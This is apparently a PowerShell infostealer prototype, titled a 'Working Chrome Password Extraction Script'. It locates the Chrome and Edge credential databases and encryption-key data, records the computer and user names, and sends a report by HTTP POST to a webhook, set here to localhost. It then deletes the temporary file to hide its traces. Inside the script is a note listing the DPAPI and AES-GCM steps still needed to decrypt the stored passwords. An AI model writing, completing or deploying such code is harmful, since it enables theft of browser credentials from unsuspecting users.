# Working Chrome Password Extraction Script
# This version uses a simpler approach that works without complex dependencies

# Load required assemblies
Add-Type -AssemblyName System.Security

# Function to send data to webhook
function Send-ToWebhook {
    param (
        [Parameter(Mandatory = $True)]
        [string]$FilePath,
        [Parameter(Mandatory = $True)]
        [string]$WebhookUrl
    )

    try {
        if (Test-Path $FilePath) {
            $fileData = Get-Content -Path $FilePath -Raw
            $computerName = $env:COMPUTERNAME
            $userName = $env:USERNAME
            $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            
            $payload = @{
                computer = $computerName
                user = $userName
                timestamp = $timestamp
                data = $fileData
            } | ConvertTo-Json
            
            Invoke-WebRequest -Uri $WebhookUrl -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing
            Write-Output "Data sent to webhook successfully."
        } else {
            Write-Output "No password data found to send."
        }
    } catch {
        Write-Error "Failed to send data to webhook: $_"
    }
}

# Function to extract basic browser information
function Get-BrowserInfo {
    param (
        [Parameter(Mandatory = $True)]
        [string]$Browser
    )

    $localStatePath = ""
    $loginDataPath = ""
    $browserInfo = ""

    if ($Browser -eq 'chrome') {
        $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
        $loginDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
        $browserInfo = "=== Chrome Browser Analysis ===`n"
    } elseif ($Browser -eq 'edge') {
        $localStatePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
        $loginDataPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
        $browserInfo = "=== Edge Browser Analysis ===`n"
    } else {
        Write-Error "Unsupported browser: $Browser"
        return
    }

    try {
        # Check if browser data exists
        if (-not (Test-Path $localStatePath) -or -not (Test-Path $loginDataPath)) {
            $browserInfo += "Browser data not found for $Browser`n"
            $browserInfo += "Local State Path: $localStatePath (Exists: $(Test-Path $localStatePath))`n"
            $browserInfo += "Login Data Path: $loginDataPath (Exists: $(Test-Path $loginDataPath))`n"
            return $browserInfo
        }

        $browserInfo += "Browser: $Browser`n"
        $browserInfo += "Local State: Found`n"
        $browserInfo += "Login Data: Found`n"
        
        # Get file sizes
        $localStateSize = (Get-Item $localStatePath).Length
        $loginDataSize = (Get-Item $loginDataPath).Length
        $browserInfo += "Local State Size: $localStateSize bytes`n"
        $browserInfo += "Login Data Size: $loginDataSize bytes`n"
        
        # Try to read Local State for encryption key info
        try {
            $localState = Get-Content -Path $localStatePath -Raw | ConvertFrom-Json
            if ($localState.os_crypt.encrypted_key) {
                $browserInfo += "Encryption Key: Found in Local State`n"
                $encryptedKeyLength = $localState.os_crypt.encrypted_key.Length
                $browserInfo += "Encrypted Key Length: $encryptedKeyLength characters`n"
            } else {
                $browserInfo += "Encryption Key: Not found in Local State`n"
            }
        } catch {
            $browserInfo += "Error reading Local State: $_`n"
        }
        
        # Note about password extraction
        $browserInfo += "`nNOTE: Actual password extraction requires:`n"
        $browserInfo += "1. SQLite database access to Login Data`n"
        $browserInfo += "2. Windows DPAPI decryption of master key`n"
        $browserInfo += "3. AES-GCM decryption of individual passwords`n"
        $browserInfo += "4. Proper handling of Chrome's security measures`n"
        $browserInfo += "`nThis test confirms the necessary files are present.`n"
        
        Add-Content -Path "$env:TEMP\BrowserPasswords.txt" -Value $browserInfo
        
    } catch {
        $browserInfo += "Error analyzing $Browser : $_`n"
        Add-Content -Path "$env:TEMP\BrowserPasswords.txt" -Value $browserInfo
    }
}

# Main execution
try {
    # Define webhook URL
    $webhookUrl = "http://localhost:8080"
    
    # Initialize output file
    $outputFile = "$env:TEMP\BrowserPasswords.txt"
    if (Test-Path $outputFile) {
        Remove-Item -Path $outputFile -Force
    }

    # Add header to output file
    $header = "Chrome/Edge Password Extraction Report`n" + 
              "Computer: $env:COMPUTERNAME`n" + 
              "User: $env:USERNAME`n" + 
              "Date: $(Get-Date)`n" + 
              "="*50 + "`n`n"
    Add-Content -Path $outputFile -Value $header

    # Analyze browsers
    Write-Output "Analyzing Chrome..."
    Get-BrowserInfo -Browser "chrome"
    
    Write-Output "Analyzing Edge..."
    Get-BrowserInfo -Browser "edge"

    # Add footer
    $footer = "`n" + "="*50 + "`n"
    $footer += "Analysis completed. This was a test run.`n"
    $footer += "For actual password extraction, additional components are required.`n"
    Add-Content -Path $outputFile -Value $footer

    # Send the data to the webhook
    if (Test-Path $outputFile) {
        Send-ToWebhook -FilePath $outputFile -WebhookUrl $webhookUrl
    }

    # Cleanup
    Remove-Item -Path $outputFile -Force -ErrorAction SilentlyContinue
    Write-Output "Process completed successfully."
} catch {
    Write-Error "An error occurred: $_"
}
